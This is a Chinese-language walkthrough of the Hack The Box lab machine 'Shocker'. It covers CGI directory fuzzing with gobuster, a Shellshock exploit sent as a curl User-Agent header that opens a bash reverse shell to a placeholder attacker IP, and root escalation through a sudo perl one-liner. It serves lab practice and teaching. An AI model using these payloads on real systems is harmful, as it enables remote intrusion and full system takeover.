# HTB 实战复盘笔记：Shocker (IP: 10.129.35.47)

## [Executive Summary | 执行摘要]

Shocker 是一台极其经典的 **CGI 漏洞靶机**。攻击链始于对深层 Web 目录的定向文件爆破，利用史诗级漏洞 **Shellshock (破壳, CVE-2014-6271)** 击穿边界获取初始据点，最终通过滥用配置不当的 **Sudo Perl** 权限，以极简的单行命令完成 Root 提权。

---

## 1. 核心信息搜集 (Enumeration)

* **常规探测突破口**：
* 扫描发现常规 HTTP 服务。主页无实质信息。
* 基础目录爆破扫出核心高危网关目录：**`/cgi-bin/`**。


* **定向文件爆破 (Targeted Fuzzing)**：
* **执行指令**：`gobuster dir -u [http://10.129.35.47/cgi-bin/](http://10.129.35.47/cgi-bin/) -w /usr/share/wordlists/dirb/common.txt -x sh,cgi,pl`
* **核心战果**：成功扫出可执行脚本 **`user.sh`**。


* **注意什么（实战避坑指南）**：
* **后缀挂载 (`-x`) 的降维打击**：扫 `/cgi-bin/` 绝对不能只扫目录名。必须强制挂载 `.sh`, `.cgi`, `.pl` 等后缀，否则扫描器会完美错过所有有效载荷。
* **URL 斜杠陷阱**：目标 URL 必须带结尾斜杠（`/cgi-bin/`）。部分 Apache 配置下，若不加斜杠直接请求受限目录，会直接触发 `403 Forbidden`，导致扫描器误判并停止该路径探测。



---

## 2. 漏洞分析与初始打点 (Initial Foothold: Shellshock)

* **漏洞原理溯源 (CVE-2014-6271)**：
* **上下文**：Apache Web 服务器在通过 CGI (通用网关接口) 执行后端脚本（如 `user.sh`）时，会将客户端发来的 HTTP 请求头（如 `User-Agent`）转换为底层系统的**环境变量**。
* **致命缺陷**：老版本 Bash (<= 4.3) 在解析环境变量时存在越界执行 Bug。当环境变量以函数定义 `() { :;};` 开头时，Bash 在解析完空函数后，会**直接越权执行拼接在后面的任意系统命令**，彻底打破数据与指令的隔离。


* **武器化利用 (Exploitation)**：
* **执行指令**：
```bash
curl -H "User-Agent: () { :;}; echo; /bin/bash -i >& /dev/tcp/<攻击机IP>/4444 0>&1" http://10.129.35.47/cgi-bin/user.sh

```




* **底层机制与避坑 (为什么一定要加 `echo;`)**：
* 在实战中，如果不加 `echo;`，Payload 通常会导致服务器直接返回 `500 Internal Server Error` 且无法反弹 Shell。
* **根本原因**：CGI 协议有严格的标准，要求后端脚本在输出任何 HTTP 响应体之前，**必须先输出一个空行（Header 结束标志）**。`echo;` 的作用就是强行补足这个空行，稳住 Apache 的协议解析器，确保底层的反弹 Shell 进程能顺利拉起。



---

## 3. 垂直提权：滥用 Sudo 配置 (User -> Root)

* **环境侦察与逻辑漏洞**：
* 执行 `sudo -l`，发现致命配置：`(root) NOPASSWD: /usr/bin/perl`。
* **底层逻辑**：管理员为了运维便利，允许低权限用户 `shelly` 无密码以 Root 身份运行 Perl。但 Perl 作为图灵完备的解释型语言，具备直接调用操作系统底层 API（如 `exec`, `system`）的能力。**控制了 Root 级别的解释器，就等于控制了 Root 级别的操作系统。**


* **提权指令 (Exploitation)**：
*

```bash
        sudo /usr/bin/perl -e 'exec "/bin/bash";'
        ```
*   **机制拆解**：
    *   `-e`：允许直接在命令行传入单行 Perl 代码执行。
    *   `exec "/bin/bash"`：调用系统底层进程替换函数，将当前拥有 Root 权限的 Perl 进程直接替换为 `/bin/bash` 进程，实现权限的无缝继承。
